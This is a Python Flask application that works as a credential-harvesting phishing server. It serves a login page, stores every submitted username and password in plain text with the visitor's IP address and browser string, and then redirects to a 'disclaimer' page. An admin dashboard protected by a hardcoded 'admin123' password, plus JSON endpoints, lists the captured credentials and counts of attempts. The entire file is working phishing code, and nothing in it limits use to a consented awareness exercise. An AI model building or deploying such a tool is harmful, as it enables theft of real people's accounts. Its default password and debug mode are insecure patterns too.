from flask import Flask, render_template, request, redirect, url_for, jsonify, session, flash
from datetime import datetime
import sqlite3
import os
from functools import wraps

app = Flask(__name__)
app.secret_key = os.urandom(24)


def init_db():
    with sqlite3.connect('phishing_data.db') as conn:
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS captured_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                location TEXT
            )
        ''')
        
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS admin_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE,
                password TEXT
            )
        ''')
        
       
        c.execute('INSERT OR IGNORE INTO admin_users (username, password) VALUES (?, ?)',
                 ('admin', 'admin123'))
        conn.commit()

init_db()


def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'admin_logged_in' not in session:
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        
        with sqlite3.connect('phishing_data.db') as conn:
            c = conn.cursor()
            c.execute('''
                INSERT INTO captured_data (username, password, ip_address, user_agent)
                VALUES (?, ?, ?, ?)
            ''', (username, password, request.remote_addr, request.user_agent.string))
            conn.commit()
        
       
        return redirect(url_for('disclaimer'))
    
    return render_template('login.html')

@app.route('/disclaimer')
def disclaimer():
    return render_template('disclaimer.html')

@app.route('/admin')
def admin():
    return redirect(url_for('admin_login'))

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        with sqlite3.connect('phishing_data.db') as conn:
            c = conn.cursor()
            c.execute('SELECT * FROM admin_users WHERE username = ? AND password = ?',
                     (username, password))
            user = c.fetchone()
            
            if user:
                session['admin_logged_in'] = True
                return redirect(url_for('admin_dashboard'))
            else:
                flash('Invalid credentials')
                return redirect(url_for('admin_login'))
    
    return render_template('admin_login.html')

@app.route('/admin/dashboard')
@admin_required
def admin_dashboard():
    return render_template('admin.html')


@app.route('/api/captured-data')
@admin_required
def get_captured_data():
    with sqlite3.connect('phishing_data.db') as conn:
        c = conn.cursor()
        c.execute('SELECT * FROM captured_data ORDER BY timestamp DESC')
        data = c.fetchall()
        
        return jsonify([{
            'timestamp': row[1],
            'username': row[2],
            'password': row[3],
            'ip_address': row[4],
            'user_agent': row[5],
            'location': row[6] if row[6] else 'Unknown'
        } for row in data])

@app.route('/api/stats')
@admin_required
def get_stats():
    with sqlite3.connect('phishing_data.db') as conn:
        c = conn.cursor()
        
        c.execute('SELECT COUNT(*) FROM captured_data')
        total_attempts = c.fetchone()[0]
        
        c.execute('SELECT COUNT(DISTINCT ip_address) FROM captured_data')
        unique_ips = c.fetchone()[0]
        
        c.execute('''
            SELECT COUNT(*) FROM captured_data 
            WHERE date(timestamp) = date('now')
        ''')
        today_attempts = c.fetchone()[0]
        
        return jsonify({
            'total_attempts': total_attempts,
            'unique_ips': unique_ips,
            'today_attempts': today_attempts
        })

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))

if __name__ == '__main__':
    app.run(debug=True)